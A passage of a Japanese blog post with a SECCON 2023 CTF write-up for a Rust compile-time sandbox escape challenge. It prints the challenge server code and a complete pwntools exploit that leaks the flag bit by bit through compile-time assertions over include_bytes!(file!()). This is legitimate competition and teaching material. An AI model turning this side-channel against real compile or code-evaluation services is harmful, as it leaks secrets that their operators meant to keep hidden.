+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tempfile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;FLAG&#34;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> re<span style="color:#f92672">.</span>fullmatch(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;SECCON{[_a-z0-9]+}&#34;</span>, FLAG)
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>pop(<span style="color:#e6db74">&#34;FLAG&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TEMPLATE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fn main() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    {{YOUR_PROGRAM}}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* Steal me: {{FLAG}} */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">🦀 Compile-Time Sandbox Escape 🦀
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Input your program (the last line must start with __EOF__):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>strip(), flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>program <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    line <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>readline()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> line<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;__EOF__&#34;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    program <span style="color:#f92672">+=</span> line
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(program) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">512</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Your program is too long. Bye👋&#34;</span><span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>source <span style="color:#f92672">=</span> TEMPLATE<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;{{FLAG}}&#34;</span>, FLAG)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;{{YOUR_PROGRAM}}&#34;</span>, program)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> tempfile<span style="color:#f92672">.</span>NamedTemporaryFile(suffix<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.rs&#34;</span>) <span style="color:#66d9ef">as</span> file:
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(source<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>flush()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>run(
+</span></span><span style="display:flex;"><span>            [<span style="color:#e6db74">&#34;rustc&#34;</span>, file<span style="color:#f92672">.</span>name],
+</span></span><span style="display:flex;"><span>            cwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/tmp&#34;</span>,
+</span></span><span style="display:flex;"><span>            stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>DEVNULL,
+</span></span><span style="display:flex;"><span>            stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>DEVNULL,
+</span></span><span style="display:flex;"><span>            timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;:)&#34;</span> <span style="color:#66d9ef">if</span> proc<span style="color:#f92672">.</span>returncode <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#34;:(&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> subprocess<span style="color:#f92672">.</span>TimeoutExpired:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;timeout&#34;</span>)
+</span></span></code></pre></div><p>Rustのコードを渡すとコンパイルして成功なら<code>:)</code>、失敗なら<code>:(</code>を返してくれるサービスを攻略する問題です。入力したコードの後にFlagの入ったコメントが追記されるので、どうにかしてこれを盗みだします。</p>
+<p>Rustは <code>const _:() = assert!(...);</code> でコンパイル時assertができ、<code>include_bytes!()</code>でコンパイル時ファイル読み取り、さらに<code>file!()</code>でコンパイル中ソースファイルのパスを取得できるので、これらを組み合わせてFlagを1ビットづつ読み出します。よく考えたらASCIIなので7ビット目は0固定でよかったですね。</p>
+<p>exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>b4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;fn main() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>af <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    /* Steal me: __FLAG__ */
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> len(b4) <span style="color:#f92672">+</span> <span style="color:#ae81ff">512</span> <span style="color:#f92672">+</span> af<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;__FLAG__&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SECCON{&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    byte <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> bit <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;const _: () = assert!(include_bytes!(file!())[</span><span style="color:#e6db74">{</span>offset <span style="color:#f92672">+</span> len(flag)<span style="color:#e6db74">}</span><span style="color:#e6db74">] &gt;= </span><span style="color:#e6db74">{</span>byte <span style="color:#f92672">|</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> bit)<span style="color:#e6db74">}</span><span style="color:#e6db74">);&#34;</span>
+</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; &#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">511</span> <span style="color:#f92672">-</span> len(p))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> len(p) <span style="color:#f92672">==</span> <span style="color:#ae81ff">511</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#r = process(argv = [&#34;python&#34;, &#34;app.py&#34;], env = {&#34;FLAG&#34;: &#34;SECCON{abcdefg}&#34;, &#34;PATH&#34;: os.environ[&#34;PATH&#34;]})</span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;crabox.seccon.games&#34;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#print(p)</span>
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendline(p<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;__EOF__&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#print(result)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;:)&#34;</span> <span style="color:#f92672">in</span> result:
+</span></span><span style="display:flex;"><span>            byte <span style="color:#f92672">|=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> bit
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#34;:(&#34;</span> <span style="color:#f92672">in</span> result:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">raise</span> <span style="color:#e6db74">&#34;fail&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        r<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">+=</span> chr(byte)
+</span></span><span style="display:flex;"><span>    print(flag)
+</span></span></code></pre></div><h2 id="おわり">おわり</h2>
+<p>戒め:
+<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">自分への戒めのために恥ずかしすぎるスコアボードを晒しておきます <a href="https://t.co/bIclTUVDx6">pic.twitter.com/bIclTUVDx6</a></p>&mdash; Kazutoshi Noguchi (@n_g_k_z) <a href="https://twitter.com/n_g_k_z/status/1703276281159458847?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</p>
+<p>完全に忘れてました:
+<blockquote class="twitter-tweet"><p lang="ja" dir="ltr">rev/pwn担当だったクセにそれぞれ2問しか解けてないの、恥ずかしすぎるでしょ<br>warmup問題ですら絶対想定解じゃないでしょってくらい変なペイロード書かないと解けなかったし、勘所を忘れてる気がする</p>&mdash; Kazutoshi Noguchi (@n_g_k_z) <a href="https://twitter.com/n_g_k_z/status/1703276979536240869?ref_src=twsrc%5Etfw">September 17, 2023</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+</p>
+<p>書いてる途中に受信した電波:<br>
+<code>writeup</code>って直訳すると<code>かきあげ</code>だよね</p>
+<p>ここまで読んてくれてありがとうね。
+
+
+ 
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+
+<div class="figure center nocaption" >
+  
+    <a class="fancybox" href="satsuki.jpg" title="さつき" data-fancybox-group="">
+  
+    <img class="fig-img" src="satsuki.jpg" style="width: 512px;" alt="さつき">
+  
+    </a>
+  
+  
+</div>
+</p>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">タグ</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://ngkz.github.io/tags/seccon/">SECCON</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">次</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2023/06/diff-oil-change/" data-tooltip="ハイゼットカーゴ(S331V後期) 前後デフオイル交換">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">前</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+      <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">Fierce Falcon Laboratory</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="https://ngkz.github.io/" property="cc:attributionName" rel="cc:attributionURL">Kazutoshi Noguchi</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>. Cover image via <a href="https://www.goodfreephotos.com/">Good Free Photos</a>.
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="1">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">次</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2023/06/diff-oil-change/" data-tooltip="ハイゼットカーゴ(S331V後期) 前後デフオイル交換">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">前</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="1">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fngkz.github.io%2F2023%2F09%2Fseccon-2023-quals-writeup%2F">
+          <i class="fa fa-facebook-official"></i><span>Facebookで共有</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fngkz.github.io%2F2023%2F09%2Fseccon-2023-quals-writeup%2F">
+          <i class="fa fa-twitter"></i><span>Twitterで共有</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fngkz.github.io%2F2023%2F09%2Fseccon-2023-quals-writeup%2F">
+          <i class="fa fa-google-plus"></i><span>Google&#43;で共有</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://ngkz.github.io/insignia.png" alt="プロフィール画像" />
+    
+    <h4 id="about-card-name">Kazutoshi Noguchi</h4>
+    
+      <div id="about-card-bio">I&rsquo;m interested in Computer, Trip, Electronics, and DIY.</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        IT/InfoSec Engineer
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Japan
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://ngkz.github.io/images/cover.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://ngkz.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/ngkz.github.io\/2023\/09\/seccon-2023-quals-writeup\/';
+          
+            this.page.identifier = '\/2023\/09\/seccon-2023-quals-writeup\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'ngkz-log';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
